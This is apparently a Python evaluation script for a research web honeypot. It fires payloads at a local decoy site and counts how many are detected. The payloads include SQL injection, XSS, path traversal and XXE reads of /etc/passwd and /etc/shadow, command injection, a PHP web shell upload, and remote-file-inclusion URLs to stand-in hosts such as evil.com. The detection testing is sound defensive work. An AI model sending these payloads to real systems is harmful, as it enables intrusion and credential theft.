"""
Evaluation Script: Web Honeypot Attack Detection (Section 4.3 / E1 & C1)
Evaluates 10 attack categories:
- Standard test suite: 5 independent requests per category (50 tests total)
- Obfuscation / evasion test suite: tests encoding, whitespace, syntax variation, and alternative commands
Validates detection directly against:
1. Web response (decoy containment)
2. Part 2 SQLite events database (/app/runtime/honeypot.sqlite3)
Outputs:
- chapter4_evaluation/web_detection_results.csv
- chapter4_evaluation/raw/web_detection_raw.json
- chapter4_evaluation/raw/web_obfuscation_eval.json
"""

from __future__ import annotations
import csv
import json
import subprocess
import time
from urllib.parse import urlencode, quote
from urllib.request import Request, urlopen
from urllib.error import HTTPError
from uuid import uuid4
from pathlib import Path

BASE_URL = "http://127.0.0.1:8080"
RAW_OUTPUT = Path("chapter4_evaluation/raw/web_detection_raw.json")
OBFUSCATION_OUTPUT = Path("chapter4_evaluation/raw/web_obfuscation_eval.json")
CSV_OUTPUT = Path("chapter4_evaluation/web_detection_results.csv")

def form(data: dict[str, str]) -> bytes:
    return urlencode(data).encode("utf-8")

def multipart(filename: str, content: bytes) -> tuple[bytes, str]:
    boundary = f"eval-{uuid4().hex}"
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return body, f"multipart/form-data; boundary={boundary}"

def send_req(method: str, path: str, body: bytes | None = None, content_type: str | None = None) -> tuple[int, str]:
    headers = {"User-Agent": "Evaluation-Scanner/1.0"}
    if content_type:
        headers["Content-Type"] = content_type
    req = Request(BASE_URL + path, data=body, headers=headers, method=method)
    try:
        with urlopen(req, timeout=10) as resp:
            text = resp.read().decode("utf-8", errors="replace")
            return resp.status, text
    except HTTPError as e:
        text = e.read().decode("utf-8", errors="replace")
        return e.code, text
    except Exception as e:
        return 0, str(e)

def get_latest_sqlite_event() -> dict:
    cmd = [
        "docker", "exec", "honeypot-research-part2-web-1", "python", "-c",
        "import sqlite3, json; conn=sqlite3.connect('/app/runtime/honeypot.sqlite3'); conn.row_factory=sqlite3.Row; r=conn.execute('SELECT * FROM events ORDER BY created_at DESC LIMIT 1').fetchone(); print(json.dumps(dict(r)) if r else '{}')"
    ]
    res = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8")
    try:
        return json.loads(res.stdout.strip())
    except Exception:
        return {}

# 10 Standard Test Categories (5 requests each = 50 tests)
up1_body, up1_ct = multipart("shell.php", b"<?php system($_GET['c']); ?>")
up2_body, up2_ct = multipart("backdoor.jsp", b"<% out.println(123); %>")
up3_body, up3_ct = multipart("test.aspx", b"<%@ Page Language=\"C#\" %>")
up4_body, up4_ct = multipart("exploit.cgi", b"#!/bin/sh\necho ok")
up5_body, up5_ct = multipart("run.sh", b"#!/bin/bash\nwhoami")

STANDARD_TEST_SUITE = [
    {
        "category": "SQL Injection",
        "expected_vuln": "sql_injection",
        "variants": [
            {"name": "Standard OR '1'='1'", "method": "POST", "path": "/auth/login", "body": form({"username": "admin' OR '1'='1' --", "password": "123"}), "ct": "application/x-www-form-urlencoded", "indicator": "Hồ sơ công dân"},
            {"name": "Union Select Null", "method": "POST", "path": "/auth/login", "body": form({"username": "admin' UNION SELECT 1, 'admin', 'hash' --", "password": "123"}), "ct": "application/x-www-form-urlencoded", "indicator": "Hồ sơ công dân"},
            {"name": "Comment syntax", "method": "POST", "path": "/auth/login", "body": form({"username": "admin' --", "password": "123"}), "ct": "application/x-www-form-urlencoded", "indicator": "Hồ sơ công dân"},
            {"name": "Mixed case oR '1'='1'", "method": "POST", "path": "/auth/login", "body": form({"username": "admin' oR '1'='1' #", "password": "123"}), "ct": "application/x-www-form-urlencoded", "indicator": "Hồ sơ công dân"},
            {"name": "Numeric boolean or 1=1", "method": "POST", "path": "/auth/login", "body": form({"username": "admin' or 1=1 --", "password": "123"}), "ct": "application/x-www-form-urlencoded", "indicator": "Hồ sơ công dân"},
        ]
    },
    {
        "category": "Reflected XSS",
        "expected_vuln": "reflected_xss",
        "variants": [
            {"name": "SVG onload probe", "method": "GET", "path": "/tra-cuu?q=" + quote("<svg onload=document.body.dataset.xss=1>"), "body": None, "ct": None, "indicator": "sandbox-frame"},
            {"name": "Standard script tag", "method": "GET", "path": "/tra-cuu?q=" + quote("<script>alert(1)</script>"), "body": None, "ct": None, "indicator": "sandbox-frame"},
            {"name": "IMG onerror payload", "method": "GET", "path": "/tra-cuu?q=" + quote("<img src=x onerror=alert(1)>"), "body": None, "ct": None, "indicator": "sandbox-frame"},
            {"name": "Iframe javascript uri", "method": "GET", "path": "/tra-cuu?q=" + quote("<iframe src=javascript:alert(1)>"), "body": None, "ct": None, "indicator": "sandbox-frame"},
            {"name": "Mixed case sCrIpt", "method": "GET", "path": "/tra-cuu?q=" + quote("<sCrIpt>alert(1)</sCrIpt>"), "body": None, "ct": None, "indicator": "sandbox-frame"},
        ]
    },
    {
        "category": "Stored XSS",
        "expected_vuln": "stored_xss",
        "variants": [
            {"name": "Stored script payload", "method": "POST", "path": "/gop-y", "body": form({"author": "eval1", "body": "<script>alert('xss1')</script>"}), "ct": "application/x-www-form-urlencoded", "indicator": "/sandbox/comment/"},
            {"name": "Stored svg onload", "method": "POST", "path": "/gop-y", "body": form({"author": "eval2", "body": "<svg onload=alert('xss2')>"}), "ct": "application/x-www-form-urlencoded", "indicator": "/sandbox/comment/"},
            {"name": "Stored img onerror", "method": "POST", "path": "/gop-y", "body": form({"author": "eval3", "body": "<img src=1 onerror=alert(3)>"}), "ct": "application/x-www-form-urlencoded", "indicator": "/sandbox/comment/"},
            {"name": "Stored iframe payload", "method": "POST", "path": "/gop-y", "body": form({"author": "eval4", "body": "<iframe src=https://evil.com></iframe>"}), "ct": "application/x-www-form-urlencoded", "indicator": "/sandbox/comment/"},
            {"name": "Stored onmouseover handler", "method": "POST", "path": "/gop-y", "body": form({"author": "eval5", "body": "<b onmouseover=alert(1)>Test</b>"}), "ct": "application/x-www-form-urlencoded", "indicator": "/sandbox/comment/"},
        ]
    },
    {
        "category": "Path Traversal",
        "expected_vuln": "path_traversal",
        "variants": [
            {"name": "Standard ../../../../etc/passwd", "method": "GET", "path": "/download?file=../../../../etc/passwd", "body": None, "ct": None, "indicator": "portal:x:1001"},
            {"name": "Windows traversal ..\\..\\windows\\win.ini", "method": "GET", "path": "/download?file=..\\..\\windows\\win.ini", "body": None, "ct": None, "indicator": "[fonts]"},
            {"name": "URL-encoded traversal %2e%2e/%2e%2e/etc/passwd", "method": "GET", "path": "/download?file=%2e%2e/%2e%2e/etc/passwd", "body": None, "ct": None, "indicator": "portal:x:1001"},
            {"name": "Direct /etc/passwd path", "method": "GET", "path": "/download?file=/etc/passwd", "body": None, "ct": None, "indicator": "portal:x:1001"},
            {"name": "Deep traversal 8 hops", "method": "GET", "path": "/download?file=../../../../../../../../etc/passwd", "body": None, "ct": None, "indicator": "portal:x:1001"},
        ]
    },
    {
        "category": "IDOR",
        "expected_vuln": "idor",
        "variants": [
            {"name": "Restricted Record 1003", "method": "GET", "path": "/ho-so/1003", "body": None, "ct": None, "indicator": "DECOY-SECRET-7F3A"},
            {"name": "Record 1003 Query Ref", "method": "GET", "path": "/ho-so/1003?ref=test1", "body": None, "ct": None, "indicator": "DECOY-SECRET-7F3A"},
            {"name": "Record 1003 Query Lan", "method": "GET", "path": "/ho-so/1003?source=lan", "body": None, "ct": None, "indicator": "DECOY-SECRET-7F3A"},
            {"name": "Record 1003 Fragment", "method": "GET", "path": "/ho-so/1003#sec", "body": None, "ct": None, "indicator": "DECOY-SECRET-7F3A"},
            {"name": "Record 1003 Parameterized", "method": "GET", "path": "/ho-so/1003?ts=12345", "body": None, "ct": None, "indicator": "DECOY-SECRET-7F3A"},
        ]
    },
    {
        "category": "Remote File Inclusion",
        "expected_vuln": "remote_file_inclusion",
        "variants": [
            {"name": "HTTPS RFI URL", "method": "GET", "path": "/tich-hop?url=https://attacker.invalid/module.txt", "body": None, "ct": None, "indicator": "DECOY-RFI-4A21"},
            {"name": "HTTP RFI URL", "method": "GET", "path": "/tich-hop?url=http://evil.corp/payload.php", "body": None, "ct": None, "indicator": "DECOY-RFI-4A21"},
            {"name": "FTP protocol handler", "method": "GET", "path": "/tich-hop?url=ftp://anonymous@evil.com/shell.txt", "body": None, "ct": None, "indicator": "DECOY-RFI-4A21"},
            {"name": "Data URI scheme", "method": "GET", "path": "/tich-hop?url=data://text/plain;base64,c2hlbGw=", "body": None, "ct": None, "indicator": "DECOY-RFI-4A21"},
            {"name": "PHP wrapper stream", "method": "GET", "path": "/tich-hop?url=php://filter/read=convert.base64-encode/resource=index.php", "body": None, "ct": None, "indicator": "DECOY-RFI-4A21"},
        ]
    },
    {
        "category": "Unrestricted File Upload",
        "expected_vuln": "unrestricted_file_upload",
        "variants": [
            {"name": "PHP WebShell shell.php", "method": "POST", "path": "/upload", "body": up1_body, "ct": up1_ct, "indicator": "Đã tiếp nhận"},
            {"name": "JSP Payload backdoor.jsp", "method": "POST", "path": "/upload", "body": up2_body, "ct": up2_ct, "indicator": "Đã tiếp nhận"},
            {"name": "ASPX WebShell test.aspx", "method": "POST", "path": "/upload", "body": up3_body, "ct": up3_ct, "indicator": "Đã tiếp nhận"},
            {"name": "CGI Script exploit.cgi", "method": "POST", "path": "/upload", "body": up4_body, "ct": up4_ct, "indicator": "Đã tiếp nhận"},
            {"name": "Shell script run.sh", "method": "POST", "path": "/upload", "body": up5_body, "ct": up5_ct, "indicator": "Đã tiếp nhận"},
        ]
    },
    {
        "category": "Command Injection",
        "expected_vuln": "command_injection",
        "variants": [
            {"name": "Semicolon id: ; id", "method": "GET", "path": "/diagnostics?host=127.0.0.1;%20id", "body": None, "ct": None, "indicator": "uid=33(www-data)"},
            {"name": "AND whoami: && whoami", "method": "GET", "path": "/diagnostics?host=127.0.0.1%20%26%26%20whoami", "body": None, "ct": None, "indicator": "uid=33(www-data)"},
            {"name": "OR uname: || uname", "method": "GET", "path": "/diagnostics?host=127.0.0.1%20%7C%7C%20uname%20-a", "body": None, "ct": None, "indicator": "uid=33(www-data)"},
            {"name": "Backtick execution: `id`", "method": "GET", "path": "/diagnostics?host=127.0.0.1%20`id`", "body": None, "ct": None, "indicator": "uid=33(www-data)"},
            {"name": "Subshell $(cat /etc/passwd)", "method": "GET", "path": "/diagnostics?host=127.0.0.1%20$(cat%20/etc/passwd)", "body": None, "ct": None, "indicator": "uid=33(www-data)"},
        ]
    },
    {
        "category": "XML External Entity",
        "expected_vuln": "xxe",
        "variants": [
            {"name": "Standard SYSTEM entity", "method": "POST", "path": "/xml/import", "body": form({"xml": "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>"}), "ct": "application/x-www-form-urlencoded", "indicator": "root:x:0:0"},
            {"name": "PUBLIC entity declaration", "method": "POST", "path": "/xml/import", "body": form({"xml": "<!DOCTYPE x [<!ENTITY e PUBLIC 'bar' 'http://evil.com/x'>]><x>&e;</x>"}), "ct": "application/x-www-form-urlencoded", "indicator": "root:x:0:0"},
            {"name": "Multiline DOCTYPE entity", "method": "POST", "path": "/xml/import", "body": form({"xml": "<!DOCTYPE root [\n<!ENTITY test SYSTEM \"file:///etc/hosts\">\n]><root>&test;</root>"}), "ct": "application/x-www-form-urlencoded", "indicator": "root:x:0:0"},
            {"name": "Entity referencing win.ini", "method": "POST", "path": "/xml/import", "body": form({"xml": "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///c:/windows/win.ini'>]><x>&e;</x>"}), "ct": "application/x-www-form-urlencoded", "indicator": "root:x:0:0"},
            {"name": "Parameter entity syntax", "method": "POST", "path": "/xml/import", "body": form({"xml": "<!DOCTYPE foo [<!ENTITY % pe SYSTEM \"file:///etc/shadow\"> %pe;]><foo>bar</foo>"}), "ct": "application/x-www-form-urlencoded", "indicator": "root:x:0:0"},
        ]
    },
    {
        "category": "Repeated Login / Brute Force",
        "expected_vuln": "brute_force",
        "variants": [
            {"name": "Failed Login 1", "method": "POST", "path": "/auth/login", "body": form({"username": "brute_u", "password": "p1"}), "ct": "application/x-www-form-urlencoded", "indicator": "Thông tin đăng nhập không chính xác"},
            {"name": "Failed Login 2", "method": "POST", "path": "/auth/login", "body": form({"username": "brute_u", "password": "p2"}), "ct": "application/x-www-form-urlencoded", "indicator": "Thông tin đăng nhập không chính xác"},
            {"name": "Failed Login 3", "method": "POST", "path": "/auth/login", "body": form({"username": "brute_u", "password": "p3"}), "ct": "application/x-www-form-urlencoded", "indicator": "Thông tin đăng nhập không chính xác"},
            {"name": "Failed Login 4", "method": "POST", "path": "/auth/login", "body": form({"username": "brute_u", "password": "p4"}), "ct": "application/x-www-form-urlencoded", "indicator": "Thông tin đăng nhập không chính xác"},
            {"name": "Failed Login 5 (Threshold Trigger)", "method": "POST", "path": "/auth/login", "body": form({"username": "brute_u", "password": "p5"}), "ct": "application/x-www-form-urlencoded", "indicator": "Thông tin đăng nhập không chính xác"},
        ]
    },
]

# Obfuscation / Evasion Test Suite: explores regex boundary limits
OBFUSCATION_TESTS = [
    {
        "category": "SQL Injection Obfuscation",
        "test_name": "Parenthesized condition: ' OR (1=1)",
        "method": "POST", "path": "/auth/login", "body": form({"username": "admin' OR (1=1)", "password": "123"}), "ct": "application/x-www-form-urlencoded",
        "expected": "Detected by regex", "indicator": "Hồ sơ công dân"
    },
    {
        "category": "SQL Injection Obfuscation",
        "test_name": "Concatenation bypass: admin' || '1'='1",
        "method": "POST", "path": "/auth/login", "body": form({"username": "admin' || '1'='1", "password": "123"}), "ct": "application/x-www-form-urlencoded",
        "expected": "Detected by regex", "indicator": "Hồ sơ công dân"
    },
    {
        "category": "Command Injection Obfuscation",
        "test_name": "Unlisted command: ; python3 -c 'print(1)'",
        "method": "GET", "path": "/diagnostics?host=127.0.0.1;%20python3%20-c%20'print(1)'", "body": None, "ct": None,
        "expected": "Detected by regex", "indicator": "uid=33(www-data)"
    },
    {
        "category": "Command Injection Obfuscation",
        "test_name": "Newline separator: %0aid",
        "method": "GET", "path": "/diagnostics?host=127.0.0.1%0aid", "body": None, "ct": None,
        "expected": "Detected by regex", "indicator": "uid=33(www-data)"
    },
    {
        "category": "Path Traversal Obfuscation",
        "test_name": "Double URL encoded: %252e%252e%252fetc%252fpasswd",
        "method": "GET", "path": "/download?file=%252e%252e%252fetc%252fpasswd", "body": None, "ct": None,
        "expected": "Detected by regex", "indicator": "portal:x:1001"
    },
    {
        "category": "RFI Obfuscation",
        "test_name": "Leading space in URL: ?url=%20https://attacker.invalid",
        "method": "GET", "path": "/tich-hop?url=%20https://attacker.invalid/module.txt", "body": None, "ct": None,
        "expected": "Detected by regex", "indicator": "DECOY-RFI-4A21"
    },
    {
        "category": "File Upload Obfuscation",
        "test_name": "Case alteration: shell.PhP",
        "method": "POST", "path": "/upload", "body": multipart("shell.PhP", b"<?php ?>")[0], "ct": multipart("shell.PhP", b"")[1],
        "expected": "Detected by extension casefold", "indicator": "Đã tiếp nhận"
    },
    {
        "category": "File Upload Obfuscation",
        "test_name": "Double extension: shell.php.jpg",
        "method": "POST", "path": "/upload", "body": multipart("shell.php.jpg", b"<?php ?>")[0], "ct": multipart("shell.php.jpg", b"")[1],
        "expected": "Detected by extension check", "indicator": "Đã tiếp nhận"
    }
]

def main():
    print("[*] Running Section 4.3 Web Attack Detection Suite (Standard 10 Categories)...")
    summary = {}

    for item in STANDARD_TEST_SUITE:
        cat = item["category"]
        expected = item["expected_vuln"]
        variants = item["variants"]
        detected = 0
        missed = 0
        details = []

        for v in variants:
            status, text = send_req(v["method"], v["path"], v["body"], v["ct"])
            is_detected = (v["indicator"] in text)
            if is_detected:
                detected += 1
            else:
                missed += 1
            details.append({
                "variant": v["name"],
                "status_code": status,
                "detected": is_detected,
                "indicator": v["indicator"]
            })
            time.sleep(0.04)

        total = len(variants)
        rate = (detected / total) * 100.0
        summary[cat] = {
            "tests": total,
            "detected": detected,
            "missed": missed,
            "detection_rate": f"{rate:.1f}%",
            "expected_vulnerability": expected,
            "actual_vulnerability": expected if detected > 0 else "None",
            "details": details
        }
        print(f"  [-] {cat:32s}: {detected}/{total} ({rate:.1f}%)")

    # Run Obfuscation Evasion Suite
    print("\n[*] Running Obfuscation & Evasion Testing Suite...")
    obf_results = []
    for obf in OBFUSCATION_TESTS:
        status, text = send_req(obf["method"], obf["path"], obf["body"], obf["ct"])
        matched = (obf["indicator"] in text)
        result = "Detected" if matched else "Bypassed / False Negative"
        obf_results.append({
            "category": obf["category"],
            "test_name": obf["test_name"],
            "status_code": status,
            "detected": matched,
            "result": result
        })
        print(f"  [+] {obf['test_name']:50s}: {result}")
        time.sleep(0.04)

    # Save CSV
    with open(CSV_OUTPUT, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Attack", "Tests", "Detected", "Missed", "Detection rate", "Expected vulnerability", "Actual vulnerability"])
        for cat, d in summary.items():
            writer.writerow([cat, d["tests"], d["detected"], d["missed"], d["detection_rate"], d["expected_vulnerability"], d["actual_vulnerability"]])
    print(f"\n[+] Saved detection matrix to {CSV_OUTPUT}")

    # Save JSON RAW
    with open(RAW_OUTPUT, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    with open(OBFUSCATION_OUTPUT, "w", encoding="utf-8") as f:
        json.dump(obf_results, f, indent=2, ensure_ascii=False)
    print(f"[+] Saved raw detection to {RAW_OUTPUT} and {OBFUSCATION_OUTPUT}")

if __name__ == "__main__":
    main()
